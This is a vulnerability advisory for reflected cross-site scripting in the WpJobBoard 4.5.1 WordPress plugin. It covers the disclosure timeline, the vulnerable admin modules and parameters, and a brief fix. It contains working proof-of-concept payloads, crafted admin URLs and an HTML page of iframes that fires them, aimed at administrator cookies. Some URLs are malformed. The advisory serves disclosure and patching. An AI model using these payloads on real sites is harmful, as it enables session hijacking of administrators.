===============
WpJobBoard v4.5.1 - Multiple Cross  Site Web Vulnerabilities


Vulnerability Class:
====================
Cross Site Scripting - Non Persistent


Current Estimated Price:
========================
500a! - 1.000a!


Product & Service Introduction:
===============================
WPJobBoard is bundled with 15+ shortcodes, allowing you to easily build completely unique job board and insert additional 
features only when you need it and only where you see fit. WPJobBoard doesnat limit your website to just a job board. 
Along with WPJB, you can still maintain a blog and take advantage of all the other features WordPress and its plugins 
and themes offer. You can keep your community and your blog, but you can add a professional job board.

(Copy of the Vendor Homepage: https://wpjobboard.net/features/ )


Abstract Advisory Information:
==============================


Vulnerability Disclosure Timeline:
==================================
2017-08-18: Non-Public Disclosure (Vulnerability Laboratory - Shared Customer Research Feed)


Discovery Status:
=================
Published


Affected Product(s):
====================
WpJobBoard

WpJobBoard


Technical Details & Description:
================================
The client-side cross site vulnerability allows remote attackers to inject own malicious script codes to client-side browser to web-application.

The vulnerabilities are located in the `query` and `id` parameters of the `wpjb-email`, `wpjb-job`, `wpjb-application` and `wpjb-membership` modules.
Remote attackers are able to inject own malicious script code to hijack admin session credentials via backend or to manipulate the backend on client-side 
performed requests. The attack vector is non-persistent and the request method to inject is GET. The attacker does not need a privileged user account to 
perform the successful exploitation.

The security risk of the client-side cross site scripting vulnerabilities are estimated as medium with a cvss (common vulnerability scoring system) count of 3.6. 
Exploitation of the client-side cross site scripting web vulnerabilities requires no privileged web-application user account and only low user interaction. 
Successful exploitation of the vulnerability results in non-persistent phishing attacks, session hijacking, non-persistent external redirect to malicious sources 
and non-persistent manipulation of affected or connected web module context.

Request Method(s):
[+] GET

Vulnerable Module(s):
[+] `wpjb-email`
[+] `wpjb-job`
[+] `wpjb-application`
[+] `wpjb-membership`

Vulnerable Parameter(s):
[+] query
[+] id

Affected Module(s):
[+] Backend - Administrator & Moderators


Proof of Concept (PoC):
=======================
The client-side cross site scripting vulnerabilities can be exploited by remote attackers without privileged web-application user account and with low user interaction.
For security demonstration or to reproduce the web-application vulnerability follow the provided information and steps below to continue.


PoC: Payload
>"<iframe+src%3Da+onload%3Dalert(document.cookie)+<div style="1
>"<iframe+src%3Da+onload%3Dalert(document.domain)+<div style="1


PoC: Exploitation
http://wpjobboard.localhost:8080wp-admin/admin.php?page=wpjb-email&action=edit&id=-1%27%3E%22%3Ciframe+src%3Da+onload%3Dalert%28document.cookie%29+%3C
http://wpjobboard.localhost:8080wp-admin/admin.php?page=wpjb-job&filter=all&query=%3E%22%3Ciframe+src%3Da+onload%3Dalert%28document.cookie%29+%3C
http://wpjobboard.localhost:8080wp-admin/admin.php?page=wpjb-application&action=index&query=%3E%22%3Ciframe+src%3Da+onload%3Dalert%28document.cookie%29+%3C
http://wpjobboard.localhost:8080wp-admin/admin.php?page=wpjb-email&action=edit&id=%3E%22%3Ciframe+src%3Da+onload%3Dalert%28document.cookie%29+%3C
http://wpjobboard.localhost:8080wp-admin/admin.php?page=wpjb-memberships&action=edit&id=%3E%22%3Ciframe+src%3Da+onload%3Dalert%28document.cookie%29+%3C



PoC: Exploit Code
<html>
<head><body>
<title></title>
<iframe src=http://wpjobboard.localhost:8080/wp-admin/admin.php?page=wpjb-email&action=edit&id=-1%27%3E%22%3Ciframe+src%3Da+onload%3Dalert%28document.cookie%29+%3C>
<iframe src=http://wpjobboard.localhost:8080/wp-admin/admin.php?page=wpjb-job&filter=all&query=%3E%22%3Ciframe+src%3Da+onload%3Dalert%28document.cookie%29+%3C>
<iframe src=http://wpjobboard.localhost:8080/wp-admin/admin.php?page=wpjb-application&action=index&query=%3E%22%3Ciframe+src%3Da+onload%3Dalert%28document.cookie%29+%3C>
<iframe src=http://wpjobboard.localhost:8080/wp-admin/admin.php?page=wpjb-email&action=edit&id=%3E%22%3Ciframe+src%3Da+onload%3Dalert%28document.cookie%29+%3C>
<iframe src=http://wpjobboard.localhost:8080/wp-admin/admin.php?page=wpjb-memberships&action=edit&id=%3E%22%3Ciframe+src%3Da+onload%3Dalert%28document.cookie%29+%3C>
</body></head>
</html>


Reference(s):
http://wpjobboard.localhost:8080/
http://wpjobboard.localhost:8080/wp-admin/
http://wpjobboard.localhost:8080wp-admin/admin.php


Solution - Fix & Patch:
=======================
The cross site scripting vulnerability can be patched by a secure parse of the vulnerable `query` and `id` parameters.
Filter and parse the output location were the execution point occurs by usage of entities. Escape the context only in case of emergency.
Filter all inserted context that runs through the affected `wpjb-email`, `wpjb-application` and `wpjb-job` modules

